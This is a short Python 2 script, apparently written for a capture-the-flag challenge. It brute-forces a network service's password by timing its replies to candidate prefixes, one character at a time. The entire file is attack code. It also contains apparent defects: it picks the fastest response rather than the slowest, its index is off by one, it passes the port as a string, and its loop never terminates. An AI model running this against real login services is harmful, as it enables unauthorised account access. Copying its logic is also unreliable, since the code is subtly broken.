#!/usr/bin/python2

import sys
import socket
import time

if sys.argv[1] != "0":
    server = sys.argv[1]
else :
    server = raw_input("server: ")

if sys.argv[2] != "0":
    port = sys.argv[2]
else:
    port = raw_input("port: ")

# server = "192.168.2.1"
# port = 3301

chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!_,.@$#"

s = socket.socket()
s.connect((server,port))

def GetTime(chr):
    stime = time.time()
    while True:
        pkt = s.recv(1024)
        if "Password: " in pkt:
            s.send(chr)
            etime = time.time()
            print "cracking Passwd:" + chr
            break
        else:
            print pkt

    rt = etime - stime
    return rt

def GetLetter(pre):
    min = 1
    ind = -1
    x = -1
    for c in chars:
        el = GetTime(pre +c)
        if el < min:
            min = el
            ind = x
        x = x + 1
    return chars[ind]

Password = ''

while True:
    Password = Password + GetLetter(Password)

s.close()
